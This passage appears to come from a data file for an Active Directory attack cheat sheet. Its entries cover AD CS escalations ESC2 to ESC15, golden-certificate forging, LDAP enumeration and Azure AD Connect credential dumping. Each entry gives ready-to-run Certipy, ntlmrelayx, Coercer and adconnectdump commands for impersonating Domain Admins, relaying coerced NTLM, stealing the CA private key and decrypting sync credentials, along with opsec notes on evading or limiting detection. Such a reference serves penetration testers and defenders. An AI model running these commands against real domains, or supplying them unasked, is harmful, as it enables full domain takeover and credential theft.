      'ESC4 is a dangerous ACL (WriteOwner/WriteDacl/WriteProperty/GenericAll, BloodHound: ADCSESC4) over a certificate template object rather than over the issued certs. Rewrite the template to be ESC1-vulnerable (enable Client Authentication EKU and ENROLLEE_SUPPLIES_SUBJECT and open enrollment), then perform the ESC1 attack to impersonate a Domain Admin, and restore the template afterward.',
    tools: [{ name: 'Certipy', url: 'https://github.com/ly4k/Certipy' }],
    commands: [
      { label: 'Make the template ESC1-vulnerable (Certipy v5 auto-saves the original)', code: r`certipy template -u user@domain.local -p pass -dc-ip 10.0.0.1 -template VulnTemplate -write-default-configuration`, lang: 'bash' },
      { label: 'Then run the ESC1 enrollment (add -sid; without it, auth is refused on Full-Enforcement DCs)', code: r`certipy req -u user@domain.local -p pass -ca CORP-CA -template VulnTemplate -upn administrator@domain.local -sid <target-objectSid>`, lang: 'bash' },
      { label: 'Restore the original template config', code: r`certipy template -u user@domain.local -p pass -dc-ip 10.0.0.1 -template VulnTemplate -write-configuration VulnTemplate.json -no-save`, lang: 'bash' },
    ],
    requires: ['A dangerous write ACL over a certificate template', 'A reachable, enabled CA to enroll against'],
    mitre: mitre('T1649'),
    references: [
      { label: 'Certipy wiki, Privilege Escalation (ESC4)', url: 'https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation' },
      { label: 'HackTricks, AD CS Domain Escalation (ESC4)', url: 'https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.html' },
      { label: 'SpecterOps, Certified Pre-Owned', url: 'https://specterops.io/blog/2021/06/17/certified-pre-owned/' },
      { label: 'The Hacker Recipes, AD CS', url: 'https://www.thehacker.recipes/ad/movement/adcs/' },
    ],
    opsec: 'Editing a template is a directory write (5136) and momentarily exposes an over-permissive template domain-wide; the subsequent cross-account cert request is logged on the CA (4886/4887). Restore the template promptly to limit the window.',
  },
  {
    id: 'adcs-esc2',
    label: 'ADCS ESC2 (Any Purpose / No EKU)',
    phase: 'priv-esc',
    needs: 'domain-user',
    summary: 'Template with Any-Purpose (or no) EKU -> use as enrollment agent.',
    description:
      'ESC2 is a template whose EKU is "Any Purpose" (or has no EKU at all), so the issued certificate can be used for anything, including acting as an enrollment agent. Unlike ESC1 you cannot specify an arbitrary SAN directly, but you can enroll, then use that cert to request a client-auth certificate on behalf of a privileged user (the ESC3 abuse), and authenticate as them. This on-behalf-of enrollment only works against v1-schema templates (e.g. the default User/Machine templates); v2+ templates enforce Required Application Policies and would need the Certificate Request Agent EKU specifically, which an Any-Purpose cert does not carry.',
    tools: [{ name: 'Certipy', url: 'https://github.com/ly4k/Certipy' }],
    commands: [
      { label: 'Request the Any-Purpose certificate', code: r`certipy req -u user@domain.local -p pass -dc-ip 10.0.0.1 -ca CORP-CA -template AnyPurpose`, lang: 'bash' },
      { label: 'Use it on behalf of a target', code: r`certipy req -u user@domain.local -p pass -dc-ip 10.0.0.1 -ca CORP-CA -template User -pfx user.pfx -on-behalf-of 'CORP\administrator'`, lang: 'bash' },
      { label: 'Authenticate as the target', code: r`certipy auth -pfx administrator.pfx -dc-ip 10.0.0.1`, lang: 'bash' },
    ],
    requires: ['Enrollment rights on a template with Any-Purpose or no EKU', 'A reachable, enabled CA'],
    mitre: mitre('T1649'),
    references: [
      { label: 'HackTricks, AD CS Domain Escalation (ESC2)', url: 'https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.html' },
      { label: 'The Hacker Recipes, Certificate templates', url: 'https://www.thehacker.recipes/ad/movement/adcs/certificate-templates' },
      { label: 'SpecterOps, Certified Pre-Owned', url: 'https://specterops.io/blog/2021/06/17/certified-pre-owned/' },
    ],
    opsec: 'If CA success auditing is enabled (off by default), requests are logged on the CA (4886/4887); an on-behalf-of request whose subject differs from the requester is a strong signal. Certificates outlive password resets.',
  },
  {
    id: 'adcs-esc3',
    aliases: ['ADCSESC3', 'EnrollOnBehalfOf', 'DelegatedEnrollmentAgent'],
    label: 'ADCS ESC3 (Enrollment Agent)',
    phase: 'priv-esc',
    needs: 'domain-user',
    summary: 'Enroll a Certificate Request Agent cert -> request on behalf of anyone.',
    description:
      'ESC3 is a template carrying the Certificate Request Agent EKU (1.3.6.1.4.1.311.20.2.1) open to low-priv enrollment. Enroll to obtain an enrollment-agent certificate, then use it to request a client-authentication certificate on behalf of a privileged user from a second (e.g. default "User") template, and authenticate as that user. For the two-step chain to succeed the second template must lack effective Enrollment Agent Restrictions (which limit which agents can enroll for which principals) and neither template can require Manager Approval, or the on-behalf-of request is blocked.',
    tools: [{ name: 'Certipy', url: 'https://github.com/ly4k/Certipy' }],
    commands: [
      { label: 'Get the enrollment-agent cert (-target the CA host when it is not the DC)', code: r`certipy req -u user@domain.local -p pass -dc-ip 10.0.0.1 -target ca.domain.local -ca CORP-CA -template EnrollmentAgent`, lang: 'bash' },
      { label: 'Request a cert on behalf of a target (-target the CA host when it is not the DC)', code: r`certipy req -u user@domain.local -p pass -dc-ip 10.0.0.1 -target ca.domain.local -ca CORP-CA -template User -pfx user.pfx -on-behalf-of 'CORP\administrator'`, lang: 'bash' },
      { label: 'Authenticate as the target', code: r`certipy auth -pfx administrator.pfx -dc-ip 10.0.0.1`, lang: 'bash' },
    ],
    requires: ['Enrollment rights on a Certificate Request Agent template', 'A second client-auth template enabled on the CA'],
    mitre: mitre('T1649'),
    references: [
      { label: 'HackTricks, AD CS Domain Escalation (ESC3)', url: 'https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.html' },
      { label: 'The Hacker Recipes, Certificate templates', url: 'https://www.thehacker.recipes/ad/movement/adcs/certificate-templates' },
      { label: 'SpecterOps, Certified Pre-Owned', url: 'https://specterops.io/blog/2021/06/17/certified-pre-owned/' },
    ],
    opsec: 'Enrollment-agent enrollment and the subsequent on-behalf-of request are both logged on the CA (4886/4887). Enrollment-agent restrictions on the CA can constrain who an agent may enroll for.',
  },
  {
    id: 'adcs-esc5',
    label: 'ADCS ESC5 (PKI Object ACL)',
    phase: 'priv-esc',
    needs: 'domain-user',
    summary: 'Weak ACL on a PKI AD object / CA host -> compromise the PKI.',
    description:
      'ESC5 covers vulnerable access control over the wider PKI footprint rather than a single template: the CA computer object, the CA server host, and AD objects under the Public Key Services container (Certificate Templates, Enrollment Services, NTAuthCertificates, AIA/CDP). Control over any of these lets you reconfigure the PKI, and the outcome depends on the vector: CA-host takeover (stealing the CA private key) yields a golden certificate; pushing a rogue CA into NTAuthCertificates makes your own rogue CA trusted for domain auth; ACL grants let you escalate to one of the above.',
    tools: [
      { name: 'Certipy', url: 'https://github.com/ly4k/Certipy' },
      { name: 'bloodyAD', url: 'https://github.com/CravateRouge/bloodyAD' },
    ],
    commands: [
      { label: 'Enumerate PKI objects & ACLs', code: r`certipy find -u user@domain.local -p pass -dc-ip 10.0.0.1 -stdout`, lang: 'bash' },
      { label: 'After CA-host takeover: back up the CA key', code: r`certipy ca -u user@domain.local -p pass -target ca.domain.local -ca CORP-CA -backup`, lang: 'bash' },
    ],
    requires: ['A dangerous ACL over a PKI AD object or the CA host', 'Owned principal holding that ACL'],
    mitre: mitre('T1649'),
    references: [
      { label: 'HackTricks, AD CS Domain Escalation (ESC5)', url: 'https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.html' },
      { label: 'The Hacker Recipes, Access controls', url: 'https://www.thehacker.recipes/ad/movement/adcs/access-controls' },
      { label: 'SpecterOps, Certified Pre-Owned', url: 'https://specterops.io/blog/2021/06/17/certified-pre-owned/' },
    ],
    opsec: 'No single clean technique: outcome depends on the object abused. DACL writes on PKI objects generate 4662/5136; CA-host takeover and key export are highly privileged actions. (T1649 once forging begins.)',
  },
  {
    id: 'adcs-esc6',
    aliases: ['ADCSESC6a', 'ADCSESC6b'],
    label: 'ADCS ESC6 (EDITF_ATTRIBUTESUBJECTALTNAME2)',
    phase: 'priv-esc',
    needs: 'domain-user',
    summary: 'CA-wide flag lets any request specify an arbitrary SAN.',
    description:
      'When the CA has the EDITF_ATTRIBUTESUBJECTALTNAME2 flag set, it honours a requester-supplied subjectAltName on ANY template, so even a benign client-auth template (e.g. the default User) becomes ESC1-like. Request a certificate with an arbitrary UPN/SID and authenticate as that user. Post-May-2022 patches mean it must be combined with a SID-mapping gap (ESC9/ESC16) to fully impersonate.',
    tools: [{ name: 'Certipy', url: 'https://github.com/ly4k/Certipy' }],
    commands: [
      { label: 'Detect the flag', code: r`certipy find -u user@domain.local -p pass -dc-ip 10.0.0.1 -stdout`, lang: 'bash' },
      { label: 'Request with an arbitrary SAN (unpatched CA, pre-KB5014754; on a patched CA the CA stamps your real SID, so pair with an ESC9/ESC16 template that lacks the SID extension)', code: r`certipy req -u user@domain.local -p pass -dc-ip 10.0.0.1 -ca CORP-CA -template User -upn administrator@domain.local -sid S-1-5-21-...-500`, lang: 'bash' },
      { label: 'Authenticate as the target', code: r`certipy auth -pfx administrator.pfx -dc-ip 10.0.0.1`, lang: 'bash' },
    ],
    requires: ['EDITF_ATTRIBUTESUBJECTALTNAME2 set on the CA', 'Enrollment on any client-auth template', 'Often a SID-mapping gap (ESC9/ESC16) post-patch'],
    mitre: mitre('T1649'),
    references: [
      { label: 'HackTricks, AD CS Domain Escalation (ESC6)', url: 'https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.html' },
      { label: 'The Hacker Recipes, Certificate authority', url: 'https://www.thehacker.recipes/ad/movement/adcs/certificate-authority' },
      { label: 'SpecterOps, Certified Pre-Owned', url: 'https://specterops.io/blog/2021/06/17/certified-pre-owned/' },
      { label: 'Microsoft, KB5014754 certificate-based authentication changes', url: 'https://support.microsoft.com/en-us/topic/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers-ad2c23b0-15d8-4340-a468-4d4f3b188f16' },
    ],
    opsec: 'The misconfig is CA-wide and easy to flag with Certipy. Cross-account requests raise 4886/4887 only if AD CS auditing is enabled (CA Auditing tab + Certification Services audit subcategory), which is off by default. Setting/clearing the flag requires CertSvc restart and is itself auditable.',
  },
  {
    id: 'adcs-esc7',
    aliases: ['ManageCA', 'ManageCertificates'],
    label: 'ADCS ESC7 (Vulnerable CA ACL)',
    phase: 'priv-esc',
    needs: 'domain-user',
    summary: 'ManageCA / Manage Certificates on the CA -> issue arbitrary certs.',
    description:
      'ESC7 is a dangerous ACL on the CA itself: the ManageCA ("CA Administrator") or Manage Certificates ("Certificate Manager") right. With ManageCA you can grant yourself the officer/Manage-Certificates right, enable the built-in SubCA template, submit a SubCA request that is DENIED (no enroll rights), then force-issue your own failed request and retrieve the cert. ManageCA can also flip EDITF_ATTRIBUTESUBJECTALTNAME2 to enable ESC6. Manage Certificates alone only covers the issue/approve step, so it suffices only when an officer and an enabled request template are already in place; ManageCA is the self-sufficient right.',
    tools: [{ name: 'Certipy', url: 'https://github.com/ly4k/Certipy' }],
    commands: [
      { label: 'Grant yourself officer (Manage Certificates)', code: r`certipy ca -u user@domain.local -p pass -ca CORP-CA -target ca.domain.local -add-officer user`, lang: 'bash' },
      { label: 'Enable the SubCA template', code: r`certipy ca -u user@domain.local -p pass -ca CORP-CA -target ca.domain.local -enable-template SubCA`, lang: 'bash' },
      { label: 'Request SubCA (gets denied -> note the request id)', code: r`certipy req -u user@domain.local -p pass -ca CORP-CA -target ca.domain.local -template SubCA -upn administrator@domain.local`, lang: 'bash' },
      { label: 'Approve the pending request', code: r`certipy ca -u user@domain.local -p pass -ca CORP-CA -target ca.domain.local -issue-request 17`, lang: 'bash' },
      { label: 'Retrieve the issued cert', code: r`certipy req -u user@domain.local -p pass -ca CORP-CA -target ca.domain.local -retrieve 17`, lang: 'bash' },
    ],
    requires: ['ManageCA or Manage Certificates over the CA', 'A reachable CA host'],
    mitre: mitre('T1649'),
    references: [
      { label: 'HackTricks, AD CS Domain Escalation (ESC7)', url: 'https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.html' },
      { label: 'The Hacker Recipes, Access controls', url: 'https://www.thehacker.recipes/ad/movement/adcs/access-controls' },
      { label: 'SpecterOps, Certified Pre-Owned', url: 'https://specterops.io/blog/2021/06/17/certified-pre-owned/' },
    ],
    opsec: 'CA configuration/permission changes and request approvals are logged on the CA: 4882 (officer/ACL change), 4886 (request received), 4888 (SubCA request denied), 4887 (force-issued). The SubCA dance leaves that denied-then-issued request trail; 4885 only appears if the operator also alters CA auditing, which this chain does not. Enabling SubCA exposes a powerful template briefly.',
  },
  {
    id: 'adcs-esc9',
    aliases: ['ADCSESC9a', 'WritePKIEnrollmentFlag'],
    label: 'ADCS ESC9 (No Security Extension)',
    phase: 'priv-esc',
    needs: 'domain-user',
    summary: 'Template lacks the SID extension -> UPN-swap impersonation.',
    description:
      'ESC9 templates set CT_FLAG_NO_SECURITY_EXTENSION in msPKI-Enrollment-Flag, so the issued certificate omits the szOID_NTDS_CA_SECURITY_EXT (SID) extension and the KDC falls back to UPN-based mapping. ESC9a is the UPN-swap on a USER account: with write rights over a victim account, set its userPrincipalName to a target (e.g. administrator), enroll as the victim, revert the UPN, then authenticate: the cert maps to the target. Needs StrongCertificateBindingEnforcement not in full-enforcement (2) mode. ESC9b (dNSHostName mapping on a MACHINE account to impersonate another computer) is a separate technique not covered by the UPN procedure here.',
    tools: [{ name: 'Certipy', url: 'https://github.com/ly4k/Certipy' }],
    commands: [
      { label: 'Get the victim NT hash (shadow creds)', code: r`certipy shadow auto -u user@domain.local -p pass -account victim -dc-ip 10.0.0.1`, lang: 'bash' },
      { label: "Swap the victim's UPN to the target", code: r`certipy account -u user@domain.local -p pass -user victim -upn administrator@domain.local update`, lang: 'bash' },
      { label: 'Enroll as the victim on the ESC9 template', code: r`certipy req -u victim@domain.local -hashes :<victim_nt> -dc-ip 10.0.0.1 -ca CORP-CA -template ESC9`, lang: 'bash' },
      { label: "Revert UPN, then auth as the target (capture the victim's original UPN with certipy account ... read before the swap and restore that exact value; do not assume victim@domain.local)", code: r`certipy account -u user@domain.local -p pass -user victim -upn victim@domain.local update`, lang: 'bash' },
    ],
    requires: ['Template with CT_FLAG_NO_SECURITY_EXTENSION + client auth', 'GenericWrite over a victim account', 'StrongCertificateBindingEnforcement != 2'],
    mitre: mitre('T1649'),
    references: [
      { label: 'HackTricks, AD CS Domain Escalation (ESC9)', url: 'https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.html' },
      { label: 'SpecterOps, Certified Pre-Owned', url: 'https://specterops.io/blog/2021/06/17/certified-pre-owned/' },
      { label: 'Oliver Lyak (IFCR), Certipy 4.0: ESC9 & ESC10 (original disclosure)', url: 'https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7' },
      { label: 'The Hacker Recipes, Certificate templates', url: 'https://www.thehacker.recipes/ad/movement/adcs/certificate-templates' },
      { label: 'Certipy wiki, Privilege Escalation', url: 'https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation' },
      { label: 'Microsoft, KB5014754: Certificate-based authentication changes on Windows domain controllers (the enforcement modes)', url: 'https://support.microsoft.com/en-us/topic/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers-ad2c23b0-15d8-4340-a468-4d4f3b188f16' },
    ],
    opsec: 'The UPN edits on the victim (5136) bracket the attack and should be reverted; cert request and PKINIT logon are logged. The KB5014754 full-enforcement mode (2) breaks ESC9.',
  },
  {
    id: 'adcs-esc10',
    aliases: ['ADCSESC10a', 'ADCSESC10b'],
    label: 'ADCS ESC10 (Weak Cert Mappings)',
    phase: 'priv-esc',
    needs: 'domain-user',
    summary: 'Weak DC mapping registry -> UPN-swap or altSecID impersonation.',
    description:
      'ESC10 abuses weak certificate-to-account mapping on the DCs. Case 1, StrongCertificateBindingEnforcement = 0: the DC ignores the SID because binding enforcement is disabled (unlike ESC9, no special template flag is needed), so write a victim UPN to the target, then enroll and authenticate: any client-auth template works. Case 2, CertificateMappingMethods = 0x4 (UPN-only): repoint a victim UPN at an account with no UPN (a machine account or built-in Administrator) and authenticate as it, typically via Schannel/LDAP. Both turn a write-over-a-victim edge into impersonation.',
    tools: [{ name: 'Certipy', url: 'https://github.com/ly4k/Certipy' }],
    commands: [
      { label: "Case 1: swap victim's UPN to target", code: r`certipy account update -u user@domain.local -p pass -user victim -upn administrator@domain.local`, lang: 'bash' },
      { label: 'Case 2: point victim UPN at a machine account', code: r`certipy account update -u user@domain.local -p pass -user victim -upn 'DC01$@domain.local'`, lang: 'bash' },
      { label: 'Enroll as victim then auth (LDAP shell). Case 2: restore the victim UPN after enrolling so the cert maps to the no-UPN target', code: r`certipy req -u victim@domain.local -hashes :<victim_nt> -ca CORP-CA -template User` + '\n' + r`certipy account update -u user@domain.local -p pass -user victim -upn victim@domain.local   # Case 2 only: revert the swapped UPN before auth` + '\n' + r`certipy auth -pfx victim.pfx -dc-ip 10.0.0.1 -ldap-shell`, lang: 'bash' },
    ],
    requires: ['StrongCertificateBindingEnforcement = 0 (Case 1) or CertificateMappingMethods = 0x4 (Case 2)', 'GenericWrite over a victim account', 'A client-auth template open to the victim'],
    mitre: mitre('T1649'),
    references: [
      { label: 'HackTricks, AD CS Domain Escalation (ESC10)', url: 'https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.html' },
      { label: 'SpecterOps, Certified Pre-Owned', url: 'https://specterops.io/blog/2021/06/17/certified-pre-owned/' },
      { label: 'The Hacker Recipes, Certificate templates', url: 'https://www.thehacker.recipes/ad/movement/adcs/certificate-templates' },
      { label: 'Certipy wiki, Privilege Escalation', url: 'https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation' },
    ],
    opsec: 'Relies on misconfigured DC registry mappings KB5014754 is meant to harden. UPN writes (5136) should be reverted; Case 2 commonly drives an LDAP/Schannel session rather than PKINIT.',
  },
  {
    id: 'adcs-esc11',
    label: 'ADCS ESC11 (Relay to ICertPassage/RPC)',
    phase: 'priv-esc',
    needs: 'none',
    summary: 'Relay coerced NTLM to the CA RPC (ICPR) enrollment endpoint.',
    description:
      'ESC11 is the RPC analogue of ESC8: if the CA MS-ICPR RPC interface does not require packet privacy (IF_ENFORCEENCRYPTICERTREQUEST not set), coerced NTLM can be relayed to the ICertPassage endpoint to enroll a certificate for the victim principal. Relay a coerced DC to obtain a DC certificate, then authenticate for a TGT and DCSync. As with ESC8, the requested template must match the relayed principal (DomainController for a DC, Machine/Computer for an ordinary host, User for a user).',
    tools: [
      { name: 'Certipy', url: 'https://github.com/ly4k/Certipy' },
      { name: 'ntlmrelayx (Impacket)', url: 'https://github.com/fortra/impacket' },
      { name: 'Coercer', url: 'https://github.com/p0dalirius/Coercer' },
    ],
    commands: [
      { label: 'Relay to the CA RPC endpoint (Certipy)', code: r`certipy relay -target 'rpc://ca.domain.local' -ca CORP-CA -template DomainController`, lang: 'bash' },
      { label: 'ntlmrelayx ICPR equivalent', code: r`ntlmrelayx.py -t rpc://ca.domain.local -rpc-mode ICPR -icpr-ca-name CORP-CA -smb2support --template DomainController`, lang: 'bash' },
      { label: 'Then coerce the DC to authenticate', code: r`Coercer coerce -u user -p pass -t dc01.domain.local -l 10.0.0.50`, lang: 'bash' },
    ],
    requires: ['CA RPC (ICPR) without enforced encryption (IF_ENFORCEENCRYPTICERTREQUEST unset)', 'A coercion vector to a privileged machine'],
    mitre: mitre('T1649'),
    references: [
      { label: 'HackTricks, AD CS Domain Escalation (ESC11)', url: 'https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.html' },
      { label: 'Compass Security, Relaying to AD CS over RPC', url: 'https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/' },
      { label: 'SpecterOps, ESC11', url: 'https://docs.specterops.io/ghostpack-docs/Certify.wik-mdx/esc11-ntlm-relay-to-ad-cs-rpc-interfaces' },
    ],
    opsec: 'Coercion is noisy and the relayed cross-account enrollment is logged on the CA. Enforcing RPC packet privacy on the CA mitigates it. Have the relay listener up before coercing.',
  },
  {
    id: 'adcs-esc13',
    aliases: ['ADCSESC13', 'OIDGroupLink'],
    label: 'ADCS ESC13 (Issuance Policy -> Group)',
    phase: 'priv-esc',
    needs: 'domain-user',
    summary: 'Enroll a template whose policy OID is linked to a privileged group.',
    description:
      'ESC13 abuses an issuance policy OID (in msPKI-Certificate-Policy) that is linked, via the OID object msDS-OIDToGroupLink, to an AD group. AD enforces that the linked group must have universal scope and must be empty, which is why these configs are rare. Authenticating with a certificate from such a template injects that group membership into the token. If a template you can enroll is linked to a privileged group (e.g. an empty universal group granted rights via ACLs), enroll and authenticate to inherit those rights, with no SAN spoofing needed.',
    tools: [{ name: 'Certipy', url: 'https://github.com/ly4k/Certipy' }],
    commands: [
      { label: 'Find OID-group-linked templates', code: r`certipy find -u user@domain.local -p pass -dc-ip 10.0.0.1 -vulnerable -stdout`, lang: 'bash' },
      { label: 'Enroll the linked template', code: r`certipy req -u user@domain.local -p pass -dc-ip 10.0.0.1 -ca CORP-CA -template ESC13Template`, lang: 'bash' },
      { label: 'Authenticate -> token gains the linked group', code: r`certipy auth -pfx user.pfx -dc-ip 10.0.0.1`, lang: 'bash' },
    ],
    requires: ['Enrollment on a template with a group-linked issuance policy', 'The linked group grants useful privileges'],
    mitre: mitre('T1649'),
    references: [
      { label: 'HackTricks, AD CS Domain Escalation (ESC13)', url: 'https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.html' },
      { label: 'SpecterOps, ADCSESC13', url: 'https://bloodhound.specterops.io/resources/edges/adcs-esc13' },
      { label: 'SpecterOps (Jonas Bulow Knudsen), ADCS ESC13 Abuse Technique', url: 'https://specterops.io/blog/2024/02/14/adcs-esc13-abuse-technique/' },
      { label: 'The Hacker Recipes, Certificate templates', url: 'https://www.thehacker.recipes/ad/movement/adcs/certificate-templates' },
    ],
    opsec: 'Enrollment looks legitimate (no SAN spoof), making ESC13 subtle; the cert request is still logged (4886/4887) and the OID-to-group link is discoverable in AD. The injected group membership appears in the resulting logon.',
  },
  {
    id: 'adcs-esc15',
    label: 'ADCS ESC15 (EKUwu / CVE-2024-49019)',
    phase: 'priv-esc',
    needs: 'domain-user',
    summary: 'Inject application policies into a v1 template CSR (EKUwu).',
    description:
      'ESC15 (EKUwu, CVE-2024-49019) abuses schema-version-1 templates that allow enrollee-supplied subjects: an attacker injects arbitrary Application Policies into the CSR, and the CA embeds them in the issued cert regardless of the template EKU. Inject Client Authentication (1.3.6.1.5.5.7.3.2) for an ESC1-style impersonation, or Certificate Request Agent (1.3.6.1.4.1.311.20.2.1) for an ESC3-style on-behalf-of. Because the cert EKU may not satisfy PKINIT, authentication is often done over LDAP/Schannel (PassTheCert).',
    tools: [
      { name: 'Certipy', url: 'https://github.com/ly4k/Certipy' },
      { name: 'PassTheCert', url: 'https://github.com/AlmondOffSec/PassTheCert' },
    ],
    commands: [
      { label: 'Inject Client Auth into a v1 template CSR (needs Certipy >= 5.0)', code: r`certipy req -u user@domain.local -p pass -dc-ip 10.0.0.1 -ca CORP-CA -template WebServer -upn administrator@domain.local --application-policies '1.3.6.1.5.5.7.3.2'`, lang: 'bash' },
      { label: 'Authenticate over LDAP (Schannel) shell', code: r`certipy auth -pfx administrator.pfx -dc-ip 10.0.0.1 -ldap-shell`, lang: 'bash' },
      { label: 'Mint an enrollment-agent cert (ESC3 step 1)', code: r`certipy req -u user@domain.local -p pass -dc-ip 10.0.0.1 -ca CORP-CA -template WebServer --application-policies '1.3.6.1.4.1.311.20.2.1'`, lang: 'bash' },
      { label: 'Enroll on behalf of a target with that agent cert (ESC3 step 2)', code: r`certipy req -u user@domain.local -p pass -dc-ip 10.0.0.1 -ca CORP-CA -template User -pfx agent.pfx -on-behalf-of 'DOMAIN\Administrator'`, lang: 'bash' },
    ],
    requires: ['A schema-version-1 template with enrollee-supplied subject', 'Enrollment rights', 'Unpatched CA (CVE-2024-49019)'],
    mitre: mitre('T1649'),
    references: [
      { label: 'HackTricks, AD CS Domain Escalation (ESC15)', url: 'https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.html' },
      { label: 'TrustedSec, EKUwu', url: 'https://trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc' },
      { label: 'SpecterOps, ESC15', url: 'https://docs.specterops.io/ghostpack-docs/Certify.wik-mdx/esc15-ekuwu-application-policy-injection' },
    ],
    opsec: 'The `--application-policies` flag is recent; verify your Certipy build supports it (Certify uses `--application-policy`). PKINIT may reject the cert (EKU mismatch), so LDAP/Schannel auth via PassTheCert is the reliable path. Patched (Nov 2024) CAs ignore the injected policy.',
  },
  {
    id: 'golden-certificate',
    aliases: ['GoldenCert'],
    label: 'Golden Certificate (Forge CA)',
    phase: 'persistence',
    needs: 'domain-admin',
    summary: 'Steal the CA private key -> forge certs for any principal forever.',
    description:
      'With the CA private key, you can forge a client-authentication certificate for ANY domain principal offline: no enrollment, no CA interaction. Extracting the key needs SYSTEM/local-admin on the CA host (the key is DPAPI-protected there), reached via CA-host compromise, DA, or ESC5 (which can yield control of the CA machine account). Note ESC7 alone does not export the key; it only lets you issue certs. This "golden certificate" survives password resets and persists until the CA cert expires or is revoked, making it a durable domain-persistence primitive.',
    tools: [{ name: 'Certipy', url: 'https://github.com/ly4k/Certipy' }],
    commands: [
      { label: 'Back up the CA cert + private key', code: r`certipy ca -u user@domain.local -p pass -ns 10.0.0.1 -target ca.domain.local -config 'CA.DOMAIN.LOCAL\CORP-CA' -backup`, lang: 'bash' },
      { label: 'Forge a cert for any principal', code: r`certipy forge -ca-pfx CORP-CA.pfx -upn administrator@domain.local -sid S-1-5-21-...-500 -crl 'ldap:///'`, lang: 'bash' },
      { label: 'Authenticate with the forged cert', code: r`certipy auth -pfx administrator_forged.pfx -dc-ip 10.0.0.1`, lang: 'bash' },
    ],
    requires: ['SYSTEM/local-admin on the CA host to export the DPAPI-protected CA private key (CA host compromise / ESC5 / DA)'],
    mitre: mitre('T1649'),
    references: [
      { label: 'HackTricks, AD CS Domain Persistence', url: 'https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/ad-certificates/domain-persistence.html' },
      { label: 'Oliver Lyak (IFCR), Certipy 2.0: Golden Certificates (original write-up)', url: 'https://research.ifcr.dk/certipy-2-0-bloodhound-new-escalations-shadow-credentials-golden-certificates-and-more-34d1c26f0dc6' },
      { label: 'The Hacker Recipes, AD CS', url: 'https://www.thehacker.recipes/ad/movement/adcs/' },
      { label: 'Certipy wiki, Post-Exploitation (Golden Certificates)', url: 'https://github.com/ly4k/Certipy/wiki/07-%E2%80%90-Post%E2%80%90Exploitation' },
    ],
    opsec: 'Forging happens entirely offline, so it is far quieter than enrollment, but exporting the CA private key is highly privileged and detectable on the CA host. Forged certs are only invalidated by CA key rotation/revocation, not password changes.',
  },
  {
    id: 'domain-object-enum',
    label: 'Domain Object Enumeration',
    phase: 'enumeration',
    needs: 'domain-user',
    summary: 'Targeted LDAP / PowerView queries for SPNs, ACLs, delegation, GPOs and trusts.',
    description:
      "Beyond BloodHound's graph, query the directory directly for specific abuse primitives: kerberoastable SPNs, AS-REP-roastable users, unconstrained / constrained delegation, dangerous ACLs, GPO links, LAPS/gMSA readers, MachineAccountQuota, and trust topology. PowerView, windapsearch and ldapdomaindump answer these precisely without the noise of a full BloodHound collection.",
    tools: [
      { name: 'bloodyAD', url: 'https://github.com/CravateRouge/bloodyAD' },
      { name: 'PowerView', url: 'https://github.com/PowerShellMafia/PowerSploit' },
      { name: 'ldapdomaindump', url: 'https://github.com/dirkjanm/ldapdomaindump' },
      { name: 'windapsearch', url: 'https://github.com/ropnop/windapsearch' },
    ],
    commands: [
      { label: 'Find objects you can write (dangerous ACLs on you) (bloodyAD)', code: 'bloodyAD -u user -p pass -d domain.local --host dc01 get writable', lang: 'bash' },
      { label: 'Find delegation (PowerView)', code: r`Get-DomainComputer -Unconstrained; Get-DomainUser -TrustedToAuth`, lang: 'powershell' },
      { label: 'Full LDAP dump', code: r`ldapdomaindump ldap://10.0.0.1 -u 'corp.local\user' -p PASS -o loot/`, lang: 'bash' },
    ],
    mitre: mitre('T1087.002'),
    references: [
      { label: 'SpecterOps, Manual Active Directory Querying', url: 'https://specterops.io/blog/2021/06/02/an-introduction-to-manual-active-directory-querying-with-dsquery-and-ldapsearch/' },
      { label: 'The Hacker Recipes, LDAP recon', url: 'https://www.thehacker.recipes/ad/recon/ldap' },
      { label: 'HackTricks, AD Methodology', url: 'https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/index.html' },
    ],
    requires: ['Any valid domain account'],
    opsec: 'Targeted LDAP reads blend with normal directory traffic far better than full BloodHound collection; large recursive GC queries are the main signal.',
  },
  {
    id: 'azure-adconnect-sync',
    label: 'Azure AD Connect Sync Creds',
    phase: 'credential-access',
    needs: 'local-admin',
    summary: 'Decrypt the directory-sync account on an Entra Connect server; it can DCSync.',
    description:
      "A server running Azure AD Connect (Entra Connect) stores its on-prem AD DS Connector account in a local SQL/LocalDB database, encrypted with DPAPI keys held by the ADSync service. With local admin or SYSTEM on that server (or read access to the ADSync database), the credentials are recovered and decrypted. Where Password Hash Synchronization is enabled, the connector account is granted DS-Replication rights, so the recovered account can DCSync the entire domain with no Domain Admin membership.",
    tools: [
      { name: 'adconnectdump', url: 'https://github.com/fox-it/adconnectdump' },
      { name: 'AADInternals', url: 'https://github.com/Gerenios/AADInternals' },
    ],
    commands: [
      { label: 'Dump + decrypt over the network against the Connect host (adconnectdump)', code: r`python adconnectdump.py DOMAIN/user:pass@connect-host`, lang: 'bash' },
